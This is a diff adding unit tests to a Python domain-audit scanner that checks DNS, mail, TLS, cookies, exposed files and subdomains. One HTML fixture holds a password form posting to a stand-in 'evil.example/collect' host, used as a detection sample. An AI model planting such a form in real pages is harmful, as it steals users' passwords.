@@ -1,4 +1,5 @@
 import base64
+import datetime
 import json
 import os
 import shutil
@@ -15,7 +16,7 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 import dns.resolver
 
-from domainscan import content_check, dns_check, files_check, helpers, http_check, mail_check, ports_check, whois_check
+from domainscan import bgp_check, content_check, dns_check, files_check, helpers, history_check, http_check, mail_check, network_check, ports_check, reputation_check, subdomain_check, web_extra_check, whois_check
 
 
 SAMPLE_WHOIS = """   Domain Name: EXAMPLE.COM
@@ -370,6 +371,12 @@ class LocalHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(body)
 
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self.send_header("Allow", "GET, HEAD, OPTIONS")
+        self.send_header("Content-Length", "0")
+        self.end_headers()
+
     def do_GET(self):
         if self.path == "/old":
             self.send_response(301)
@@ -529,6 +536,326 @@ class ZAppStubTest(unittest.TestCase):
         finally:
             sys.modules.pop("tkinter", None)
             sys.modules.pop("domainscan.app", None)
+
+
+class HashTest(unittest.TestCase):
+    def test_murmur_vectors(self):
+        self.assertEqual(helpers.murmur3_32(b""), 0)
+        self.assertEqual(helpers.murmur3_32(b"hello"), 613153351)
+        self.assertEqual(helpers.murmur3_32(b"hello"), helpers.murmur3_32("hello"))
+
+    def test_favicon_hash(self):
+        self.assertEqual(helpers.favicon_hash(b"\x00\x01\x02\x03\x04\x05"), 1045060958)
+        value = helpers.favicon_hash(b"something")
+        self.assertTrue(-2 ** 31 <= value < 2 ** 31)
+
+
+class WhoisDateTest(unittest.TestCase):
+    def test_parse_formats(self):
+        first = whois_check.parse_date_flexible("1995-08-14T04:00:00Z")
+        self.assertEqual((first.year, first.month, first.day), (1995, 8, 14))
+        second = whois_check.parse_date_flexible("2024-01-31")
+        self.assertEqual((second.year, second.month, second.day), (2024, 1, 31))
+        third = whois_check.parse_date_flexible("14-Aug-1995")
+        self.assertEqual((third.year, third.month, third.day), (1995, 8, 14))
+        self.assertIsNone(whois_check.parse_date_flexible("not a date"))
+
+    def test_age_rows(self):
+        now = datetime.datetime.now(datetime.timezone.utc)
+        created = (now - datetime.timedelta(days=3650)).strftime("%Y-%m-%d")
+        expires = (now + datetime.timedelta(days=300)).strftime("%Y-%m-%d")
+        data = rows_to_dict(whois_check.age_rows(created, expires))
+        self.assertIn("days", data["Domain age"])
+        self.assertIn("Expires in", data["Domain expiry"])
+        past = (now - datetime.timedelta(days=10)).strftime("%Y-%m-%d")
+        data = rows_to_dict(whois_check.age_rows(created, past))
+        self.assertIn("Expired", data["Domain expiry"])
+
+
+class DnsParseTest(unittest.TestCase):
+    def test_parse_soa(self):
+        rows = dns_check.parse_soa(["ns1.example.com. admin.example.com. 2024010101 7200 3600 1209600 3600"])
+        data = rows_to_dict(rows)
+        self.assertEqual(data["SOA primary NS"], "ns1.example.com.")
+        self.assertEqual(data["SOA contact"], "admin@example.com")
+        self.assertEqual(data["SOA serial"], "2024010101")
+        self.assertEqual(dns_check.parse_soa([]), [])
+
+    def test_parse_caa(self):
+        rows = dns_check.parse_caa(['0 issue "letsencrypt.org"', '0 issuewild ";"'])
+        data = rows_to_dict(rows)
+        self.assertIn("letsencrypt.org", data["CAA policy 1"])
+        self.assertIn("Yes", data["CAA restricts issuance"])
+        rows = dns_check.parse_caa([])
+        self.assertIn("No CAA records", rows[0][1])
+
+
+class FakeSMTPServer(threading.Thread):
+    def __init__(self):
+        super().__init__(daemon=True)
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.bind(("127.0.0.1", 0))
+        self.sock.listen(1)
+        self.port = self.sock.getsockname()[1]
+
+    def run(self):
+        try:
+            conn, _ = self.sock.accept()
+            conn.settimeout(5)
+            conn.sendall(b"220 fake.test ESMTP\r\n")
+            data = conn.recv(1024)
+            if b"EHLO" in data.upper():
+                conn.sendall(b"250-fake.test\r\n250-STARTTLS\r\n250 HELP\r\n")
+            try:
+                conn.recv(1024)
+            except Exception:
+                pass
+            conn.close()
+        except Exception:
+            pass
+        finally:
+            try:
+                self.sock.close()
+            except Exception:
+                pass
+
+
+class MailExtraTest(unittest.TestCase):
+    def test_spf_lookups(self):
+        tokens = ["include:_spf.google.com", "ip4:192.0.2.0/24", "mx", "~all"]
+        self.assertEqual(mail_check.spf_lookups(tokens), 2)
+        rows = mail_check.describe_spf(["v=spf1 " + " ".join(tokens)])
+        data = rows_to_dict(rows)
+        self.assertEqual(data["SPF DNS lookups"], "2 of max 10")
+
+    def test_tlsrpt(self):
+        resolver = FakeResolver({("_smtp._tls.example.com", "TXT"): ['"v=TLSRPTv1; rua=mailto:x@y"']})
+        rows = mail_check.describe_tlsrpt(resolver, "example.com")
+        self.assertIn("TLSRPTv1", rows[0][1])
+
+    def test_autoconfig(self):
+        resolver = FakeResolver({("autodiscover.example.com", "A"): ["192.0.2.10"]})
+        rows = mail_check.describe_autoconfig(resolver, "example.com")
+        data = rows_to_dict(rows)
+        self.assertEqual(data["autodiscover.example.com"], "192.0.2.10")
+        self.assertEqual(data["autoconfig.example.com"], "No A record")
+
+    def test_starttls_offered(self):
+        server = FakeSMTPServer()
+        server.start()
+        try:
+            self.assertEqual(mail_check.smtp_starttls("127.0.0.1", port=server.port), "Offered")
+        finally:
+            server.join(timeout=5)
+
+    def test_starttls_unreachable(self):
+        sock = socket.socket()
+        sock.bind(("127.0.0.1", 0))
+        port = sock.getsockname()[1]
+        sock.close()
+        self.assertEqual(mail_check.smtp_starttls("127.0.0.1", port=port), "Unreachable")
+
+
+HTML2 = """<html><head><title>T2</title>
+<meta name="description" content="abcdefghijklmnopqrstuvwxyz0123">
+<meta property="og:title" content="T2"><meta property="og:type" content="website">
+<link rel="canonical" href="https://example.com/t2">
+<link rel="alternate" hreflang="en" href="https://example.com/t2">
+<link rel="alternate" hreflang="tr" href="https://example.com/tr/t2">
+</head><body>
+<!-- TODO: remove debug key, password=123 -->
+<form action="https://evil.example/collect" method="post"><input type="password" name="p"></form>
+<img src="http://cdn.example/pic.png">
+<script>fetch("/api/users");var x="/static/app.js";</script>
+<button onclick="go()">Go</button>
+</body></html>"""
+
+
+class ContentExtraTest(unittest.TestCase):
+    def test_deep_rows(self):
+        result = content_check.collect(HTML2, "https://example.com/t2", {}, [])
+        data = rows_to_dict(result["rows"])
+        self.assertEqual(data["Password fields"], "1")
+        self.assertEqual(data["External form targets"], "1")
+        self.assertIn("evil.example", data["External form 1"])
+        self.assertEqual(data["Mixed content refs"], "1")
+        self.assertEqual(data["HTML comments"], "1")
+        self.assertIn("password", data["Comment keywords"])
+        self.assertEqual(data["JS paths (inline)"], "2")
+        self.assertEqual(data["Inline event handlers"], "1")
+        self.assertEqual(data["Canonical URL"], "https://example.com/t2")
+        self.assertEqual(data["Hreflang count"], "2")
+        self.assertEqual(data["Hreflang langs"], "en, tr")
+        self.assertEqual(data["OG completeness"], "2 of 4")
+        self.assertEqual(data["Description length"], "30 characters")
+
+
+class ReputationParseTest(unittest.TestCase):
+    def test_listed_and_clean(self):
+        resolver = FakeResolver({("34.216.184.93.zen.spamhaus.org", "A"): ["127.0.0.4"]})
+        rows = reputation_check.collect(["93.184.216.34"], resolver=resolver)["rows"]
+        data = rows_to_dict(rows)
+        self.assertIn("Listed", data["93.184.216.34 on Spamhaus ZEN"])
+        self.assertIn("XBL", data["93.184.216.34 on Spamhaus ZEN"])
+        self.assertEqual(data["93.184.216.34 on SpamCop"], "Clean")
+        self.assertEqual(data["DNSBL listings"], "1 of 4 checks")
+
+
+class BgpParseTest(unittest.TestCase):
+    def test_parsers(self):
+        rows = []
+        asn = bgp_check.parse_ip_info({"prefix": "93.184.216.0/24", "asn": 15133, "name": "EDGECAST", "country_code": "US"}, "93.184.216.34", rows)
+        self.assertEqual(asn, 15133)
+        data = rows_to_dict(rows)
+        self.assertEqual(data["93.184.216.34 prefix"], "93.184.216.0/24")
+        self.assertEqual(data["93.184.216.34 origin ASN"], "AS15133")
+        bgp_check.parse_asn_info({"ipv4_prefixes": [{}, {}], "ipv6_prefixes": [{}]}, 15133, rows)
+        data = rows_to_dict(rows)
+        self.assertEqual(data["AS15133 IPv4 prefixes"], "2")
+        bgp_check.parse_peers([{"asn": 6939, "name": "Hurricane Electric", "country_code": "US"}], 15133, rows)
+        data = rows_to_dict(rows)
+        self.assertEqual(data["AS15133 peer count"], "1")
+        self.assertIn("AS6939", data["AS15133 peer 1"])
+
+
+class HistoryParseTest(unittest.TestCase):
+    def test_available(self):
+        data = {"archived_snapshots": {"closest": {"url": "http://web.archive.org/web/20240101120000/https://example.com/", "timestamp": "20240101120000", "status": "200"}}}
+        rows = history_check.parse_available(data)
+        parsed = rows_to_dict(rows)
+        self.assertEqual(parsed["Latest snapshot"], "2024-01-01 12:00:00 (HTTP 200)")
+        rows = history_check.parse_available({})
+        self.assertIn("No snapshots", rows[0][1])
+
+    def test_first_and_years(self):
+        rows = history_check.parse_first([["timestamp", "original", "statuscode"], ["20020101000000", "http://example.com/", "200"]])
+        self.assertIn("2002-01-01 00:00:00", rows[0][1])
+        rows = history_check.parse_years([["timestamp"], ["20200101000000"], ["20210101000000"], ["20210601000000"]])
+        data = rows_to_dict(rows)
+        self.assertEqual(data["Archived years"], "2")
+        self.assertEqual(data["Active years"], "2020, 2021")
+        self.assertEqual(history_check.format_timestamp("20240101120000"), "2024-01-01 12:00:00")
+        self.assertEqual(history_check.format_timestamp(""), "Unknown date")
+
+
+class SubdomainParseTest(unittest.TestCase):
+    def test_crt(self):
+        certs, names, wild = subdomain_check.parse_crt([{"name_value": "a.example.com\n*.example.com\n"}, {"name_value": "b.example.com"}])
+        self.assertEqual(certs, 2)
+        self.assertEqual(names, {"a.example.com", "b.example.com"})
+        self.assertEqual(wild, 1)
+
+    def test_sonar(self):
+        self.assertEqual(subdomain_check.parse_sonar(["X.EXAMPLE.COM ", ""]), {"x.example.com"})
+
+    def test_hostsearch(self):
+        text = "c.example.com,1.2.3.4\nerror limit reached\nbad line\n"
+        self.assertEqual(subdomain_check.parse_hostsearch(text), {"c.example.com"})
+
+    def test_takeover_match(self):
+        self.assertTrue(subdomain_check.is_takeover_candidate("x.github.io"))
+        self.assertTrue(subdomain_check.is_takeover_candidate("github.io"))
+        self.assertFalse(subdomain_check.is_takeover_candidate("example.com"))
+        self.assertFalse(subdomain_check.is_takeover_candidate("notgithub.io.evil.com"))
+
+
+class CookieFlagTest(unittest.TestCase):
+    def test_parse(self):
+        info = http_check.parse_set_cookie("a=1; Path=/; Secure; HttpOnly; SameSite=Lax")
+        self.assertEqual(info["name"], "a")
+        self.assertTrue(info["secure"])
+        self.assertTrue(info["httponly"])
+        self.assertEqual(info["samesite"], "Lax")
+        info = http_check.parse_set_cookie("b=2")
+        self.assertFalse(info["secure"])
+        self.assertFalse(info["httponly"])
+
+    def test_rows(self):
+        rows = http_check.cookie_flag_rows(["a=1; Secure; HttpOnly", "b=2"])
+        data = rows_to_dict(rows)
+        self.assertEqual(data["Cookies missing Secure"], "1")
+        self.assertEqual(data["Cookies missing HttpOnly"], "1")
+
+
+class WebExtraLocalTest(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls):
+        cls.httpd = HTTPServer(("127.0.0.1", 0), LocalHandler)
+        cls.port = cls.httpd.server_address[1]
+        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
+        cls.thread.start()
+        cls.base = "http://127.0.0.1:" + str(cls.port)
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.httpd.shutdown()
+        cls.httpd.server_close()
+
+    def test_collect(self):
+        headers = {"Alt-Svc": 'h3=":443"; ma=86400'}
+        result = web_extra_check.collect(self.base, headers, timeout=5)
+        data = rows_to_dict(result["rows"])
+        self.assertEqual(data["OPTIONS status"], "200")
+        self.assertEqual(data["Allowed methods"], "GET, HEAD, OPTIONS")
+        self.assertEqual(data["PUT status"], "501")
+        self.assertIn("Disabled or blocked", data["TRACE method"])
+        self.assertIn("Yes", data["HTTP/3 advertised"])
+        self.assertEqual(data["404 probe status"], "404")
+        self.assertEqual(data["404 handling"], "Standard 404 page")
+        self.assertEqual(data["/.git/HEAD"], "Not found")
+        self.assertEqual(data["IPv6 web"], "No AAAA record")
+
+    def test_pure_helpers(self):
+        self.assertIn("Yes", web_extra_check.parse_alt_svc('h3=":443"; ma=86400'))
+        self.assertIn("No", web_extra_check.parse_alt_svc(""))
+        self.assertIn("EXPOSED", web_extra_check.verdict_sensitive(200, "ref: refs/heads/main", "ref:"))
+        self.assertEqual(web_extra_check.verdict_sensitive(404, "", None), "Not found")
+        self.assertIn("Protected", web_extra_check.verdict_sensitive(403, "", None))
+
+    def test_favicon_hash_row(self):
+        result = files_check.collect(self.base, timeout=5)
+        data = rows_to_dict(result["rows"])
+        self.assertEqual(data["Favicon hash"], "1045060958 (Shodan-compatible)")
+
+
+class TlsProbeTest(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls):
+        cls.tmp = tempfile.mkdtemp()
+        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", "key.pem", "-out", "cert.pem", "-days", "2", "-nodes", "-subj", "/CN=localhost"], cwd=cls.tmp, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120, check=True)
+        cls.proc = subprocess.Popen(["openssl", "s_server", "-accept", "127.0.0.1:18444", "-cert", "cert.pem", "-key", "key.pem", "-quiet"], cwd=cls.tmp, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        for _ in range(50):
+            try:
+                sock = socket.create_connection(("127.0.0.1", 18444), timeout=1)
+                sock.close()
+                break
+            except Exception:
+                time.sleep(0.2)
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.proc.terminate()
+        try:
+            cls.proc.wait(timeout=5)
+        except Exception:
+            cls.proc.kill()
+        shutil.rmtree(cls.tmp, ignore_errors=True)
+
+    @unittest.skipUnless(shutil.which("openssl"), "openssl not available")
+    def test_probes(self):
+        result = http_check.collect_tls("127.0.0.1", 18444)
+        data = rows_to_dict(result["rows"])
+        self.assertIn("ALPN protocol", data)
+        self.assertIn("Legacy TLS", data)
+        self.assertIn("TLS 1.3", data)
+        self.assertIn("HTTP/2", data)
+
+
+class PingTest(unittest.TestCase):
+    @unittest.skipUnless(shutil.which("ping"), "ping not available")
+    def test_localhost(self):
+        result = network_check.ping("127.0.0.1")
+        self.assertTrue("Reply" in result or "No reply" in result)
 
 
 if __name__ == "__main__":
